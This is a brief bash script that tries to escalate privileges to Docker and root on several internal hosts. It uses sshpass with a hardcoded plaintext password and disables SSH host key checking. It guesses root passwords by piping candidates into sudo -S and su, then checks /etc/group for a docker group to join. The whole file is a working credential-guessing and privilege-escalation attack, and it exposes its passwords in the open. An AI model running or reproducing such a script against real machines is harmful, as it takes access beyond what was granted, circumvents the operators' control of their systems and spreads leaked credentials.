#!/bin/bash
# Try to get Docker access via various escalation methods

SSH_OPTS="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10"
PASS="T3l3h0us#"
ROOT_PASS="telehouse"

# Method 1: Try sudo with password on Backend N1 (has sudo group)
echo "=== Method 1: sudo on Backend N1 ==="
sshpass -p "$PASS" ssh $SSH_OPTS -p 2332 telehouse@10.4.4.21 "echo '$PASS' | sudo -S docker ps" 2>&1

# Method 2: Try su to root with root password on all servers
echo ""
echo "=== Method 2: su on Frontend with root=telehouse ==="
sshpass -p "$PASS" ssh $SSH_OPTS telehouse@10.4.4.87 "echo 'telehouse' | su -c 'docker ps'" 2>&1

echo ""
echo "=== Method 3: su on Backend N2 with root=telehouse ==="
sshpass -p "$PASS" ssh $SSH_OPTS telehouse@10.4.4.90 "echo 'telehouse' | su -c 'docker ps'" 2>&1

# Method 4: Try root password = user password
echo ""
echo "=== Method 4: su with root=T3l3h0us# (same as user) ==="
sshpass -p "$PASS" ssh $SSH_OPTS telehouse@10.4.4.87 "echo 'T3l3h0us#' | su -c 'docker ps'" 2>&1

# Check if there's a docker group we can join
echo ""
echo "=== Checking docker group existence ==="
sshpass -p "$PASS" ssh $SSH_OPTS telehouse@10.4.4.87 "grep docker /etc/group" 2>&1
sshpass -p "$PASS" ssh $SSH_OPTS telehouse@10.4.4.90 "grep docker /etc/group" 2>&1
